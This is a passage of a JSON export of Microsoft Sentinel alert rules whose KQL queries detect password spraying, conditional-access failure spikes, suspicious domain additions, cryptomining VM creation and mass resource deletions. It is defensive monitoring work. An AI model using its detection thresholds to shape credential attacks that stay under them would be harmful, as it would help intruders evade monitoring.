desc","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"Midnight Blizzard - Successful Signin From Non-Compliant Device","enabled":true,"description":"Detects successful sign ins from devices marked non-compliant. Best practice is to block sign ins from non-complaint devices, however if allowed monitor these events to ensure they do not lead to other risky activity. \nRef: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-devices#non-compliant-device-sign-in\nThis query has also been updated to include UEBA logs IdentityInfo and BehaviorAnalytics for contextual information around the results.\n\nhttps://github.com/Azure/Azure-Sentinel/blob/master/Hunting%20Queries/SigninLogs/SuccessfulSigninFromNon-CompliantDevice.yaml\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004,TA0005;T1078;T1078.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T21:41:08.4687683Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/e334bb22-f0b0-4355-b60f-4aaeeaf3f5f7","name":"e334bb22-f0b0-4355-b60f-4aaeeaf3f5f7","etag":"\"87007920-0000-2700-0000-66fdbdd60000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let riskScoreCutoff = 20; //Adjust this based on volume of results\r\n  let starttime = 14d;\r\n  let timeframe = 1d;\r\n  let scorethreshold = 3;\r\n  let baselinethreshold = 50;\r\n  let aadFunc = (tableName:string){\r\n    // Failed Signins attempts with reasoning related to conditional access policies.\r\n    table(tableName)\r\n    | where TimeGenerated between (startofday(ago(starttime))..startofday(now()))\r\n    | where ResultDescription has_any (\"conditional access\", \"CA\") or ResultType in (50005, 50131, 53000, 53001, 53002, 52003, 70044)\r\n    | extend UserPrincipalName = tolower(UserPrincipalName)\r\n    | extend timestamp = TimeGenerated, AccountCustomEntity = UserPrincipalName\r\n  };\r\n  let aadSignin = aadFunc(\"SigninLogs\");\r\n  let aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\r\n  let allSignins = union isfuzzy=true aadSignin, aadNonInt;\r\n  let TimeSeriesAlerts = \r\n  allSignins\r\n  | make-series DailyCount=count() on TimeGenerated from startofday(ago(starttime)) to startofday(now()) step 1d by UserPrincipalName\r\n  | extend (anomalies, score, baseline) = series_decompose_anomalies(DailyCount, scorethreshold, -1, 'linefit')\r\n  | mv-expand DailyCount to typeof(double), TimeGenerated to typeof(datetime), anomalies to typeof(double), score to typeof(double), baseline to typeof(long)\r\n  // Filtering low count events per baselinethreshold\r\n  | where anomalies > 0 and baseline > baselinethreshold\r\n  | extend AnomalyHour = TimeGenerated\r\n  | project UserPrincipalName, AnomalyHour, TimeGenerated, DailyCount, baseline, anomalies, score;\r\n  // Filter the alerts for specified timeframe\r\n  TimeSeriesAlerts\r\n  | where TimeGenerated > startofday(ago(timeframe))\r\n  | join kind=inner ( \r\n    allSignins\r\n    | where TimeGenerated > startofday(ago(timeframe))\r\n    // create a new column and round to hour\r\n    | extend DateHour = bin(TimeGenerated, 1h)\r\n    | summarize PartialFailedSignins = count(), LatestAnomalyTime = arg_max(TimeGenerated, *) by bin(TimeGenerated, 1h), OperationName, Category, ResultType, ResultDescription, UserPrincipalName, UserDisplayName, AppDisplayName, ClientAppUsed, IPAddress, ResourceDisplayName\r\n  ) on UserPrincipalName, $left.AnomalyHour == $right.DateHour\r\n  | project LatestAnomalyTime, OperationName, Category, UserPrincipalName, UserDisplayName, ResultType, ResultDescription, AppDisplayName, ClientAppUsed, UserAgent, IPAddress, Location, AuthenticationRequirement, ConditionalAccessStatus, ResourceDisplayName, PartialFailedSignins, TotalFailedSignins = DailyCount, baseline, anomalies, score\r\n  | extend timestamp = LatestAnomalyTime, Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\r\n  | extend UserPrincipalName = tolower(UserPrincipalName)\r\n  | join kind=leftouter (\r\n      IdentityInfo\r\n      | summarize LatestReportTime = arg_max(TimeGenerated, *) by AccountUPN\r\n      | extend BlastRadiusInt = iif(BlastRadius == \"High\", 1, 0)\r\n      | project AccountUPN, Tags, JobTitle, GroupMembership, AssignedRoles, UserType, IsAccountEnabled, BlastRadiusInt\r\n      | summarize\r\n          Tags = make_set(Tags, 1000),\r\n          GroupMembership = make_set(GroupMembership, 1000),\r\n          AssignedRoles = make_set(AssignedRoles, 1000),\r\n          BlastRadiusInt = sum(BlastRadiusInt),\r\n          UserType = make_set(UserType, 1000),\r\n          UserAccountControl = make_set(UserType, 1000)\r\n      by AccountUPN\r\n      | extend UserPrincipalName=tolower(AccountUPN)\r\n  ) on UserPrincipalName\r\n  | join kind=leftouter (\r\n      BehaviorAnalytics\r\n      | where ActivityType in (\"FailedLogOn\", \"LogOn\")\r\n      | where isnotempty(SourceIPAddress)\r\n      | project UsersInsights, DevicesInsights, ActivityInsights, InvestigationPriority, SourceIPAddress\r\n      | project-rename IPAddress = SourceIPAddress\r\n      | summarize\r\n          UsersInsights = make_set(UsersInsights, 1000),\r\n          DevicesInsights = make_set(DevicesInsights, 1000),\r\n          IPInvestigationPriority = sum(InvestigationPriority)\r\n      by IPAddress)\r\n  on IPAddress\r\n  | extend UEBARiskScore = BlastRadiusInt + IPInvestigationPriority\r\n  | where UEBARiskScore > riskScoreCutoff\r\n  | sort by UEBARiskScore desc ","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"Midnight Blizzard - User Accounts - Sign in Failure due to CA Spikes","enabled":true,"description":"Identifies spike in failed sign-ins from user accounts due to conditional access policy. Spike is determined based on Time series anomaly which will look at historical baseline values. \n\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-user-accounts#monitoring-for-failed-unusual-sign-ins\n\nThis query has also been updated to include UEBA logs IdentityInfo and BehaviorAnalytics for contextual information around the results.\n\nhttps://github.com/Azure/Azure-Sentinel/blob/master/Solutions/Azure%20Active%20Directory/Analytic%20Rules/UserAccounts-CABlockedSigninSpikes.yaml\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0005;T1548;T1548.005,TA0006;T1110;T1110.001,TA0007;T1087;T1087.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T21:40:33.9805317Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/55eaac76-6b8e-4dc6-a93b-387c6ea3657c","name":"55eaac76-6b8e-4dc6-a93b-387c6ea3657c","etag":"\"87000c24-0000-2700-0000-66fdbe100000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"AuditLogs\r\n  | where AADOperationType == \"Add\"\r\n  | where Result == \"success\"\r\n  | where OperationName in (\"Add verified domain\", \"Add unverified domain\")\r\n  | extend InitiatedBy = parse_json(InitiatedBy)\r\n  | extend InitiatingUser = tostring(InitiatedBy.user.userPrincipalName)\r\n  | extend InitiatingIp = tostring(InitiatedBy.user.ipAddress)\r\n  | extend InitiatingApp = tostring(InitiatedBy.app.displayName)\r\n  | extend InitiatingSPID = tostring(InitiatedBy.app.servicePrincipalId)\r\n  | extend DomainAdded = tostring(TargetResources[0].displayName)\r\n  | where DomainAdded has \"onmicrosoft\"\r\n  | extend ActionInitiatedBy = case(isnotempty(InitiatingUser), InitiatingUser, strcat(InitiatingApp, \" - \", InitiatingSPID))\r\n  | extend UserName = split(InitiatingUser, \"@\")[0]\r\n  | extend UPNSuffix = split(InitiatingUser, \"@\")[1]\r\n  | project-reorder TimeGenerated, OperationName, DomainAdded, ActionInitiatedBy, InitiatingIp","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserName"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"},{"identifier":"AadTenantId","columnName":"InitiatingSPID"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"InitiatingIp"}]},{"entityType":"DNS","fieldMappings":[{"identifier":"DomainName","columnName":"DomainAdded"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["ResourceDevelopment"],"techniques":["T1585"],"displayName":"Midnight Blizzard - New onmicrosoft domain added to tenant","enabled":true,"description":"This detection looks for new onmicrosoft domains being added to a tenant. \n  An attacker who compromises a tenant may register a new onmicrosoft domain in order to masquerade as a service provider for launching phishing campaigns.\n  Domain additions are not a common occurrence and users should validate that the domain was added by a legitimate user, with a legitimate purpose.\n\nhttps://github.com/Azure/Azure-Sentinel/blob/master/Solutions/Azure%20Active%20Directory/Analytic%20Rules/NewOnmicrosoftDomainAdded.yaml\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0003;T1136;T1136.003","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T21:41:35.3983063Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/6b08c8b1-a093-4812-ab54-3514e64139b1","name":"6b08c8b1-a093-4812-ab54-3514e64139b1","etag":"\"8700746d-0000-2700-0000-66fdc30c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let thresholdForUniqueFailedAccounts = 20;\r\nlet upperBoundOfFailedLogonsPerAccount = 10;\r\nlet ratioSuccessFailedLogons = 0.5;\r\nlet timeframe = 1d;\r\nDeviceLogonEvents\r\n| where TimeGenerated >= ago(timeframe)\r\n| where LogonType != \"Unlock\" and ActionType in (\"LogonSuccess\", \"LogonFailed\")\r\n| where not(isempty(RemoteIP) and isempty(RemoteDeviceName))\r\n| extend LocalLogon=parse_json(AdditionalFields)\r\n| where RemoteIPType != \"Loopback\"\r\n| summarize \r\n    SuccessLogonCount = countif(ActionType == \"LogonSuccess\"),\r\n    FailedLogonCount = countif(ActionType == \"LogonFailed\"),\r\n    UniqueAccountFailedLogons=dcountif(AccountName, ActionType == \"LogonFailed\"),\r\n    FirstFailed=minif(TimeGenerated, ActionType == \"LogonFailed\"),\r\n    LastFailed=maxif(TimeGenerated, ActionType == \"LogonFailed\"),\r\n    LastTimestamp=arg_max(TimeGenerated, tostring(ReportId))\r\n    by RemoteIP, RemoteDeviceName, DeviceName, MachineGroup //Remote IP is here the source of the logon attempt.\r\n| project-rename TargetDeviceName = DeviceName\r\n| project-rename TargetMachineGroup = MachineGroup\r\n| where UniqueAccountFailedLogons > thresholdForUniqueFailedAccounts\r\n    and SuccessLogonCount * ratioSuccessFailedLogons < FailedLogonCount\r\n    and UniqueAccountFailedLogons * upperBoundOfFailedLogonsPerAccount > FailedLogonCount \r\n//Run this query (seperate) to pullback more information from DeviceLogonEvents\r\n//DeviceLogonEvents\r\n//| where TimeGenerated between ( datetime(09-06-2023, 06:21:42.2695082) .. datetime(09-06-2023, 06:33:02.7499625) )\r\n//| where DeviceName has \"DeviceName\"\r\n//| where RemoteIP has \"RemoteIp\"","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetDeviceName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"RemoteIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess","InitialAccess"],"techniques":["T1110"],"displayName":"COLS-NA - Brute Force: Password Spraying","enabled":true,"description":"Technical description of the attack: \nThe query searches for failed logins from a single source towards multiple different accounts and provides three parameters to tune the results for your specific environment. The full details of the working are described in the blog post linked above.\n\nA password spraying attack is detected, where a single machine has performed a large number of failed login attempts, with a large number of different accounts. For each account, the attacker uses just a few attempts to prevent account lockout. This query uses the DeviceLogonEvents per machine to detect a password spraying attacks. The machine against which the password spraying is performed (can be DC, a server or even an endpoint) needs to be enrolled in Microsoft Defender for Endpoint.\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0006;T1110;T1110.001,TA0007;T1087;T1087.003;T1087.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:02:50.7287079Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/03404f85-aa19-4a5a-b3d3-beed73dc3741","name":"03404f85-aa19-4a5a-b3d3-beed73dc3741","etag":"\"ec00781a-0000-2700-0000-65f07f120000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"NRT","properties":{"severity":"Medium","query":"let tokens = dynamic([\"416\",\"208\",\"192\",\"128\",\"120\",\"96\",\"80\",\"72\",\"64\",\"48\",\"44\",\"40\",\"nc12\",\"nc24\",\"nv24\"]);\nlet operationList = dynamic([\"microsoft.compute/virtualmachines/write\", \"microsoft.resources/deployments/write\"]);\nAzureActivity\n| where OperationNameValue in~ (operationList)\n| where ActivityStatusValue startswith \"Accept\"\n| where Properties has 'vmSize'\n| extend parsed_property= parse_json(tostring((parse_json(Properties).responseBody))).properties\n| extend vmSize = tostring((parsed_property.hardwareProfile).vmSize)\n| mv-apply token=tokens to typeof(string) on (where vmSize contains token)\n| extend ComputerName = tostring((parsed_property.osProfile).computerName)\n| project TimeGenerated, OperationNameValue, ActivityStatusValue, Caller, CallerIpAddress, ComputerName, vmSize\n| extend Name = tostring(split(Caller,'@',0)[0]), UPNSuffix = tostring(split(Caller,'@',1)[0])\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Caller"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"ComputerName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"CallerIpAddress"}]}],"templateVersion":"2.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1578"],"displayName":"NRT Creation of expensive computes in Azure","enabled":true,"description":"Identifies the creation of large size or expensive VMs (with GPUs or with a large number of virtual CPUs) in Azure.\nAn adversary may create new or update existing virtual machines to evade defenses or use them for cryptomining purposes.\nFor Windows/Linux Vm Sizes, see https://docs.microsoft.com/azure/virtual-machines/windows/sizes \nAzure VM Naming Conventions, see https://docs.microsoft.com/azure/virtual-machines/vm-naming-conventions","alertRuleTemplateName":"56fe0db0-6779-46fa-b3c5-006082a53064","lastModifiedUtc":"2024-03-12T16:13:05.9544181Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/5114c98d-56a2-40a8-ae7a-f360ef9ffe7e","name":"5114c98d-56a2-40a8-ae7a-f360ef9ffe7e","etag":"\"6f097773-0000-2700-0000-669975940000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let starttime = 14d;\nlet endtime = 1d;\nlet timeframe = 1h;\nlet TotalEventsThreshold = 25; \nlet TimeSeriesData = \nAzureActivity \n| where TimeGenerated between (startofday(ago(starttime))..startofday(ago(endtime)))\n| where OperationNameValue endswith \"delete\" \n| project TimeGenerated, Caller \n| make-series Total = count() on TimeGenerated from startofday(ago(starttime)) to startofday(ago(endtime)) step timeframe by Caller; \nlet TimeSeriesAlerts = materialize(TimeSeriesData \n| extend (anomalies, score, baseline) = series_decompose_anomalies(Total, 3, -1, 'linefit') \n| mv-expand Total to typeof(double), TimeGenerated to typeof(datetime), anomalies to typeof(double), score to typeof(double), baseline to typeof(long) \n| where anomalies > 0 \n| project Caller, TimeGenerated, Total, baseline, anomalies, score \n| where Total > TotalEventsThreshold and baseline > 0 ); \nTimeSeriesAlerts \n| where TimeGenerated > (ago(endtime)) \n| project TimeGenerated, Caller \n| join kind = inner (AzureActivity \n| where TimeGenerated > (ago(endtime)) \n| where OperationNameValue endswith \"delete\" \n| summarize count(), make_set(OperationNameValue), make_set(Resource) by bin(TimeGenerated, 1h), Caller) on TimeGenerated, Caller \n| extend Name = iif(Caller has '@',tostring(split(Caller,'@',0)[0]),\"\")\n| extend UPNSuffix = iif(Caller has '@',tostring(split(Caller,'@',1)[0]),\"\")\n| extend AadUserId = iif(Caller !has '@',Caller,\"\")\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"},{"identifier":"AadUserId","columnName":"AadUserId"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":["T1485"],"displayName":"Threat Essentials - Mass Cloud resource deletions Time Series Anomaly","enabled":true,"description":"This query generates baseline pattern of cloud resource deletions by an user and generated anomaly when any unusual spike is detected.\nThese anomalies from unusual or privileged users could be an indication of cloud infrastructure take-down by an adversary ","alertRuleTemplateName":"fa2658fe-3714-4c55-bb12-2b7275c628e8","lastModifiedUtc":"2024-07-18T20:05:38.5959678Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8039fcd1-d600-4a14-9f81-75b365da9dba","name":"8039fcd1-d600-4a14-9f81-75b365da9dba","etag":"\"6f09dfb3-0000-2700-0000-669976200000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":1,"severity":"Medium","query":"let threshold = 1;\nunion isfuzzy=true(\nAZFWApplicationRule\n| where Action == \"Deny\"\n| summarize StartTime = min(TimeGenerated), count() by SourceIp, Fqdn, Action, Protocol\n| where count_ >= [\"threshold\"]),\n(AZFWNetworkRule\n| where Action == \"Deny\"\n| extend Fqdn = DestinationIp\n| summarize StartTime = min(TimeGenerated), count() by SourceIp, Fqdn, Action, Protocol\n| where count_ >= [\"threshold\"]),\n(AZFWFlowTrace\n| where Action == \"Deny\"\n| extend Fqdn = DestinationIp\n| summarize StartTime = min(TimeGenerated), count() by SourceIp, Fqdn, Action, Protocol\n| where count_ >= [\"threshold\"]),\n(AZFWIdpsSignature\n| where Action == \"Deny\"\n| extend Fqdn = DestinationIp\n| summarize StartTime = min(TimeGenerated), count() by SourceIp, Fqdn, Action, Protocol\n| where count_ >= [\"threshold\"]),\n(AzureDiagnostics\n| where OperationName in (\"AzureFirewallApplicationRuleLog\",\"AzureFirewallNetworkRuleLog\")\n| extend msg_s_replaced0 = replace(@\"\\s\\s\",@\" \",msg_s)\n| extend msg_s_replaced1 = replace(@\"\\.\\s\",@\" \",msg_s_replaced0)\n| extend msg_a = split(msg_s_replaced1,\" \")\n| extend srcAddr_a = split(msg_a[3],\":\") , destAddr_a = split(msg_a[5],\":\")\n| extend Protocol = tostring(msg_a[0]), SourceIp = tostring(srcAddr_a[0]), srcPort = tostring(srcAddr_a[1]), DestinationIp = tostring(destAddr_a[0]), destPort = tostring(destAddr_a[1]), Action = tostring(msg_a[7])\n| where Action == \"Deny\"\n| extend Fqdn = iff(DestinationIp matches regex \"\\\\d+\\\\.\\\\d+\\\\.\\\\d+\\\\.\\\\d+\",\"\",DestinationIp)\n| summarize StartTime = min(TimeGenerated), count() by SourceIp, Fqdn, Action, Protocol\n| where count_ >= [\"threshold\"])\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"SourceIp"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Fqdn"}]}],"templateVersion":"1.1.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Discovery","LateralMovement","CommandAndControl"],"techniques":["T1046","T1071","T1210"],"displayName":"Several deny actions registered","enabled":true,"description":"Identifies attack pattern when attacker tries to move, or scan, from resource to resource on the network and creates an incident when a source has more than 1 registered deny action in Azure Firewall.","alertRuleTemplateName":"f8dad4e9-3f19-4d70-ab7f-8f19ccd43a3e","lastModifiedUtc":"2024-07-18T20:07:58.9688549Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ac080d8d-37f6-42ae-968a-d8e439b4e493","name":"ac080d8d-37f6-42ae-968a-d8e439b4e493","etag":"\"75085e4b-0000-2700-0000-662958940000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet emailregex = @'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+$';\nThreatIntelligenceIndicator\n//Filtering the table for Email related IOCs\n| where isnotempty(EmailSenderAddress)\n| where TimeGenerated >= ago(ioc_lookBack)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (\n    SecurityAlert\n    | where TimeGenerated >= ago(dt_lookBack)\n    | extend MSTI = case(AlertName has \"TI map\" and VendorName == \"Microsoft\" and ProductName == 'Azure Sentinel', true, false)\n    | where MSTI == false\n    // Converting Entities into dynamic data type and use mv-expand to unpack the array\n    | extend EntitiesDynamicArray = parse_json(Entities) | mv-expand EntitiesDynamicArray\n    // Parsing relevant entity column to filter type account and creating new column by combining account and UPNSuffix\n    | extend Entitytype = tostring(parse_json(EntitiesDynamicArray).Type), EntityName = tostring(parse_json(EntitiesDynamicArray).Name),\n    EntityUPNSuffix = tostring(parse_json(EntitiesDynamicArray).UPNSuffix)\n    | where Entitytype =~ \"account\"\n    | extend EntityEmail = tolower(strcat(EntityName, \"@\", EntityUPNSuffix))\n    | where EntityEmail matches regex emailregex\n    | extend Alert_TimeGenerated = TimeGenerated\n)\non $left.EmailSenderAddress == $right.EntityEmail\n| where Alert_TimeGenerated < ExpirationDateTime\n| summarize Alert_TimeGenerated = arg_max(Alert_TimeGenerated, *) by IndicatorId, AlertName\n| project Alert_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore,\nEmailSenderName, EmailRecipient, EmailSourceDomain, EmailSourceIpAddress, EmailSubject, FileHashValue, FileHashType, EntityEmail, AlertName, AlertType,\nAlertSeverity, Entities, ProviderName, VendorName\n| extend Name = tostring(split(EntityEmail, '@', 0)[0]), UPNSuffix = tostring(split(EntityEmail, '@', 1)[0])\n| extend timestamp = Alert_TimeGenerated\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"EntityEmail"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Url"}]}],"templateVersion":"1.2.7","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI map Email entity to SecurityAlert","enabled":true,"description":"Identifies a match in SecurityAlert table from any Email IOC from TI which will extend coverage to datatypes such as MCAS, StorageThreatProtection and many others","alertRuleTemplateName":"a2e36ce0-da4d-4b6e-88c6-4e40161c5bfc","lastModifiedUtc":"2024-04-24T19:08:03.4825201Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/e7aca712-9c91-4569-b563-cfd65d4f9f00","name":"e7aca712-9c91-4569-b563-cfd65d4f9f00","etag":"\"26019c8e-0000-2700-0000-65e0d2ba0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet URLRegex = \"((https?|ftp|ldap|wss?|file):\\\\/\\\\/(([\\\\:\\\\%\\\\w\\\\_\\\\-]+(\\\\.|@))*((xn--)?[a-zA-Z0-9\\\\-]+\\\\.)+(xn--[a-z0-9]+|[A-Za-z]+)|\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{0,3})[.,:\\\\w@?^=%&\\\\/~+#-]*[\\\\w@?^=%&\\\\/~+#-])\";\nlet SecurityEvents = materialize(SecurityAlert\n  | where TimeGenerated >= ago(dt_lookBack)\n  | extend MSTI = case(AlertName has \"TI map\" and VendorName == \"Microsoft\" and ProductName == 'Azure Sentinel', true, false)\n  | where MSTI == false\n  // Extract URL from JSON data\n  | mv-expand parse_json(Entities)\n  | where isnotempty(Entities.Url) or isnotempty(Entities.Urls)\n  | extend Url = coalesce(Entities.Url, Entities.Urls)\n  | mv-expand Url\n  | extend Url = tolower(Url)\n  // Extract hostname from JSON data for entity mapping\n  | extend Compromised_Host = tostring(parse_json(ExtendedProperties).[\"Compromised Host\"])\n  | extend Alert_TimeGenerated = TimeGenerated);\nlet EventUrls = materialize(SecurityEvents | distinct Url | summarize make_list(Url));\nThreatIntelligenceIndicator\n| where isnotempty(Url)\n| where TimeGenerated >= ago(ioc_lookBack)\n| extend Url = tolower(Url)\n| where tolower(Url) in (EventUrls)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n| where Description !contains_cs \"State: inactive;\" and Description !contains_cs \"State: falsepos;\" \n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (SecurityEvents) on Url\n| where Alert_TimeGenerated < ExpirationDateTime\n| summarize Alert_TimeGenerated = arg_max(Alert_TimeGenerated, *) by IndicatorId, AlertName\n| project timestamp = Alert_TimeGenerated, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, AlertName, AlertSeverity, Description, Url, 